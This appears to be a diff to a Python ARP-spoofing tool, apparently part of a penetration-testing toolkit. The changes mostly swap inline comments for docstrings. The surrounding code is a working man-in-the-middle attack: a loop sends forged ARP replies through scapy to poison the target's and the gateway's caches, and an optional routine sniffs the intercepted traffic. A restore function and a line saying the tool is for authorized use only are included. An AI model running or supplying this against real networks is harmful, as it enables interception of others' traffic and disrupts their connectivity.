@@ -8,9 +8,15 @@ from rich.table import Table
 from rich.progress import Progress
 
 class ARPSpoofing:
+    """ 
+    This is my arp cache posioning class it also does MITM attacks which are optional, this should only be ran on authorized systems 
+    """
     description = "ARP cache poisoning and man-in-the-middle attacks"
     
     def __init__(self):
+        """ 
+        initialize the arp spoofing object
+        """
         self.console = Console()
         self.target_ip = None
         self.gateway_ip = None
@@ -19,6 +25,9 @@ class ARPSpoofing:
         self.spoofing_thread = None
         
     def run(self):
+        """
+        This runs the attack
+        """
         try:
             self.console.print(
                 Panel.fit(
@@ -55,6 +64,9 @@ class ARPSpoofing:
             )
     
     def _get_attack_config(self):
+        """
+        prompt the user for target ip, gateway ip and interfrace they want to use 
+        """
         self.console.print("\n[bold]ARP Spoofing Configuration[/bold]")
         
         target_ip = self.console.input("[cyan]Target IP address[/cyan]: ").strip()
@@ -68,15 +80,20 @@ class ARPSpoofing:
         }
     
     def _confirm_attack(self):
+        """
+        double check if the user wants to run this attack and asks them to continue 
+        """
         confirm = self.console.input(
             "\n[bold red]WARNING: ARP spoofing will disrupt network traffic. Continue?[/bold red] (y/N): "
         ).strip().lower()
         return confirm == 'y'
     
     def _start_arp_spoofing(self):
+        """ 
+        start the arp spoofing process 
+        """
         self.console.print("\n[bold]Starting ARP Cache Poisoning...[/bold]")
         
-        # Get our MAC address
         our_mac = get_if_hwaddr(self.interface)
         
         self.console.print(f"[cyan]Our MAC address:[/cyan] {our_mac}")
@@ -100,44 +117,45 @@ class ARPSpoofing:
             self._stop_arp_spoofing()
     
     def _spoof_loop(self, our_mac):
-        """Main ARP spoofing loop"""
+        """
+        loop that runs in the packground to help with spoofing 
+        """
         packet_count = 0
         
         while self.is_spoofing:
             try:
-                # Tell the target that we are the gateway
                 target_packet = Ether(dst=getmacbyip(self.target_ip)) / ARP(
-                    op=2,  # ARP reply
-                    psrc=self.gateway_ip,  # Pretend to be gateway
-                    pdst=self.target_ip,   # Send to target
-                    hwsrc=our_mac          # With our MAC
+                    op=2,  
+                    psrc=self.gateway_ip,  
+                    pdst=self.target_ip,   
+                    hwsrc=our_mac          
                 )
                 
-                # Tell the gateway that we are the target
                 gateway_packet = Ether(dst=getmacbyip(self.gateway_ip)) / ARP(
-                    op=2,  # ARP reply
-                    psrc=self.target_ip,   # Pretend to be target
-                    pdst=self.gateway_ip,  # Send to gateway
-                    hwsrc=our_mac          # With our MAC
+                    op=2,  
+                    psrc=self.target_ip,    
+                    pdst=self.gateway_ip, 
+                    hwsrc=our_mac         
                 )
                 
-                # Send both packets
                 sendp(target_packet, iface=self.interface, verbose=0)
                 sendp(gateway_packet, iface=self.interface, verbose=0)
                 
                 packet_count += 2
                 
-                if packet_count % 20 == 0:  # Print status every 10 pairs
+                if packet_count % 20 == 0: 
                     self.console.print(f"[dim]Sent {packet_count} ARP packets...[/dim]")
                 
-                time.sleep(2)  # Send every 2 seconds
-                
+                time.sleep(2)
+
             except Exception as e:
                 self.console.print(f"[yellow]Error in spoofing loop: {e}[/yellow]")
                 time.sleep(5)
     
     def _stop_arp_spoofing(self):
-        """Stop ARP spoofing and restore ARP tables"""
+        """
+        stop arp spoofing to restore arp table
+        """
         self.console.print("\n[bold yellow]Stopping ARP spoofing...[/bold yellow]")
         
         self.is_spoofing = False
@@ -155,14 +173,14 @@ class ARPSpoofing:
         )
     
     def _restore_arp_tables(self):
-        """Send legitimate ARP packets to restore correct MAC mappings"""
+        """
+        send legitimate arp requests to restore correct mac's in arp table
+        """
         try:
-            # Get real MAC addresses
             target_mac = getmacbyip(self.target_ip)
             gateway_mac = getmacbyip(self.gateway_ip)
             our_mac = get_if_hwaddr(self.interface)
             
-            # Restore target's ARP table
             target_restore = Ether(dst=target_mac) / ARP(
                 op=2,
                 psrc=self.gateway_ip,
@@ -171,7 +189,6 @@ class ARPSpoofing:
                 hwdst=target_mac
             )
             
-            # Restore gateway's ARP table  
             gateway_restore = Ether(dst=gateway_mac) / ARP(
                 op=2,
                 psrc=self.target_ip,
@@ -180,7 +197,6 @@ class ARPSpoofing:
                 hwdst=gateway_mac
             )
             
-            # Send restore packets multiple times
             for _ in range(5):
                 sendp(target_restore, iface=self.interface, verbose=0)
                 sendp(gateway_restore, iface=self.interface, verbose=0)
@@ -190,7 +206,9 @@ class ARPSpoofing:
             self.console.print(f"[yellow]Error restoring ARP tables: {e}[/yellow]")
     
     def _sniff_traffic(self):
-        """Optional: Sniff traffic while in MITM position"""
+        """
+        optional: sniffs for traffic/ip while being in mitm 
+        """
         self.console.print("\n[bold]Starting traffic sniffing...[/bold]")
         
         def packet_handler(packet):
@@ -201,7 +219,6 @@ class ARPSpoofing:
                 
                 self.console.print(f"[dim]IP: {src} -> {dst} Protocol: {proto}[/dim]")
         
-        # Start sniffing in background
         sniff_thread = threading.Thread(
             target=lambda: sniff(
                 iface=self.interface, 
